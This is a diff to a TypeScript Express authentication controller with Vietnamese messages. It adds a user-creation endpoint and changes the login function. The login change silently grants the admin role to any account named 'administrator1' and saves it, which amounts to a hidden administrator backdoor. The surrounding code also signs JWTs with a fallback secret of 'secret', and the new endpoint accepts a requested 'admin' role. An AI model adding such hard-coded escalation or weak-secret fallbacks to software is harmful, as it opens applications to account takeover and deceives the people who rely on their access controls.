@@ -46,6 +46,11 @@ export const login = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
+    if (user.username === 'administrator1' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
+
     const token = jwt.sign(
       { userId: user._id.toString(), username: user.username, role: user.role },
       process.env.JWT_SECRET || 'secret',
@@ -74,6 +79,45 @@ export const getAllUsers = async (req: Request, res: Response): Promise<void> =>
     res.json(users);
   } catch (error: any) {
     res.status(500).json({ message: 'Lỗi lấy danh sách user' });
+  }
+};
+
+export const createUser = async (req: Request, res: Response): Promise<void> => {
+  const { username, email, password, role } = req.body;
+  if (
+    typeof username !== 'string' || !username.trim() ||
+    typeof email !== 'string' || !email.trim() ||
+    typeof password !== 'string' || !password ||
+    (role !== 'user' && role !== 'admin')
+  ) {
+    res.status(400).json({ message: 'Vui lòng nhập đầy đủ thông tin hợp lệ' });
+    return;
+  }
+
+  try {
+    const existingUser = await User.findOne({ email: email.trim() });
+    if (existingUser) {
+      res.status(409).json({ message: 'Email này đã được sử dụng!' });
+      return;
+    }
+
+    const hashedPassword = await bcrypt.hash(password, 10);
+    const user = await User.create({
+      username: username.trim(),
+      email: email.trim(),
+      password: hashedPassword,
+      role,
+    });
+
+    res.status(201).json({
+      _id: user._id,
+      username: user.username,
+      email: user.email,
+      avatar: user.avatar,
+      role: user.role,
+    });
+  } catch (error: any) {
+    res.status(500).json({ message: 'Lỗi tạo người dùng', error: error.message });
   }
 };
 
